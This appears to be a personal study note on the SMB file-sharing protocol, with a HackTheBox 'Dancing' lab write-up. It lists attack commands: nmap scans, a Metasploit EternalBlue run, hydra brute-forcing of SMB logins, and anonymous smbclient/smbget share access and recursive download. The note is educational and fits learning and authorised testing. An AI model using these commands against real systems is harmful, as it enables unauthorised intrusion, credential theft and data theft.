---
layout: note
title: "Server Message Block(SMB)"
description: "is a communication protocol"
tags: [smb, network, client-server]
date: 2025-07-25
---

# Server Message Block(SMB)
_The Server Message Block (SMB) protocol is a client-server communication protocol used for sharing access to files, printers, serial ports and other resources on a network_

- **SMB** a crucial protocol in Windows environments.
- Known as a response-request protocol, the SMB protocol is one of the most common methods used for network communications.
- The client sends an SMB request to the server to initiate the connection.
- When the server receives the request, it sends an SMB response back to the client, establishing the communication channel necessary for a two-way conversation.(similar to SYN-ACK connection)
- Once it is granted access, the client can access the required resource for reading, writing, executing and so on.
- Allowing remote access to directories and files (like \\server\share).
- SMB runs directly over **TCP/IP** and uses **port 445**.
- It also uses **port 139** which is kinda old through this service **"NetBIOS"**.


# Approach
- **Scan for Open SMB Ports**
```bash
nmap -p 445,139 <target_IP>
```
- **Checks for SMB Version** like if SMBv1 is enabled
```bash
nmap --script smb-protocols -p 445 <target_IP>
```
- **Exploit with Metasploit** for instance the *EternalBlue* exploit is available on **Metasploit**.
```bash
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <target_IP>
exploit
```
- Brute-Force Weak Credentials (if SMB allows login):
```bash
hydra -L users.txt -P passwords.txt smb://<target_IP>
```

## More SMB commands
- *`smbclient` - ftp-like client to access SMB/CIFS resources on servers*
- List SMB Shares (anonymous login):
```bash
smbclient -L //<target_IP> -N
```
    - `-L`: List available shares
    - `-N`: No password (anonymous login), Bypasses authentication if guest access is allowed.
- Access a Share:
```bash
smbclient //<target_IP>/sharename -N
```
- Download Files from SMB:
```bash
smbget -R smb://<target_IP>/sharename -U ""
```
    - `-R`: Recursive download, Downloading Files Recursively (Without Interactive Login), Fetches all files/subdirectories in the share.
    - `-U ""`: Blank username, Forces anonymous login (no password).

- *When we connect to the `smbclient`, we can do the following*:
    - List files:
    ```bash
    ls
    ```
    - Download a file:
    ```bash
    get <file>
    ```
    - Upload a file:
    ```bash
    put <file>
    ```
    - Change Directory:
    ```bash
    cd <dir>
    ```
    - Lol 😀 just exit:
    ```bash
    exit
    ```
<br>

## HackTheBox Lab: Dancing
![htb dancing](/assets/img/htb-dancing.PNG){: .writeup-image}
- One of the interesting question asked was the following:
    - *What is the service name for port 445 that came up in our Nmap scan?*
    ![htb dancing](/assets/img/htb-dancing(1).PNG){: .writeup-image}
    - The only important things are the ones that i have highlighted under this context.
    - Also, allow me to explain the commands and tags i used:
    - `nmap`: network mapping utility.
    - `-Pn`: This option tells Nmap to skip the host discovery phase (By default, Nmap tries to determine if a host is up before scanning it), and also useful in environments where ICMP (ping) responses are blocked.
    - `-A`: It provides a more comprehensive analysis of the target.
    - Now the answer to the question above is *microsoft-ds*. I mention this because i only knew a little regarding that service, and hence i thought i should include the information about that service here:
        - The "DS" (Directory Services) part of the name is crucial.
        - Port 445 isn't just for file sharing; it's a fundamental channel for **Active Directory communication**.
        - But, basically *microsoft-ds* is When a client wants to connect to a share using the modern method, it talks directly to the *microsoft-ds* service on **port 445**.
        - It is also, enabled by default. The standard for modern SMB.
        - This is in contrast to, NetBIOS Session which is an older service running on **port 139**, as i mentioned above.
    - And the following picture shows how i found the **root flag**:
    ![htb dancing](/assets/img/htb-dancing(2).PNG){: .writeup-image}
        - `-L`: List all the shares present in the remote server. It is an initial step for RECON.
        - `-N`: Anonymous login (and also by pressing enter)
    ![htb dancing](/assets/img/htb-dancing(3).PNG){: .writeup-image}
    - I have highlighted the **commands**.
    



## Why is SMB vulnerable?
- In 2017, the WannaCry and Petya ransomware attacks exploited a vulnerability in SMB 1.0 that made it possible to load malware on vulnerable clients and then propagate the malware across networks.
- **Famous SMB Exploits**
    - *EternalBlue (MS17-010)* -> Exploits SMBv1 buffer overflow, and hence allowed for Remote Code Execution (RCE).
    - *SMBGhost (CVE-2020-0796)* -> SMBv3 compression flaw, and the impact of the exploit was RCE, DoS.
    - *SMB Relay Attacks* -> Forwards SMB auth to another machine, and the impact of this was Credential theft, lateral movement.
    - *SambaCry (CVE-2017-7494)*-> Linux Samba RCE, which allowed for a Remote shell.